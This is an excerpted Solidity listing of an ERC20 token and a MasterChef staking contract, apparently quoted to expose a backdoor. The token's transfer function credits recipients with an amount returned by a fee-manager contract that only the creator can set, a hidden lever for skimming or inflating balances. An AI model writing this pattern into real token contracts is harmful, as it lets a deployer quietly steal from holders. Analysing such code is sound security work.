...
interface IFeeManager {
    function getTrueAmount(address sender, address recipient, uint256 amount) external returns (uint256);
}
...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    function setFeeManager(address _fm) public {
        require(_msgSender() == _creator, "no u bro");
        _feeManager = _fm;
    }
    ...
    function _transfer(
        ...
        uint256 trueAmount = _feeManager != address(0) ? IFeeManager(_feeManager).getTrueAmount(sender,recipient,amount) : amount;
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            _balances[sender] = senderBalance - amount;
        }
        _balances[recipient] += trueAmount;
...
contract MasterChef is Ownable, ReentrancyGuard {
    ...
    function deposit(uint256 _pid, uint256 _amount) public nonReentrant {
        ...
        if (_amount > 0) {
            // Account for transfer taxes on any token
    ...
    function setDevAddress(address _devAddress) public {
        require(msg.sender == devAddress, "setDevAddress: wut?");
        devAddress = _devAddress;
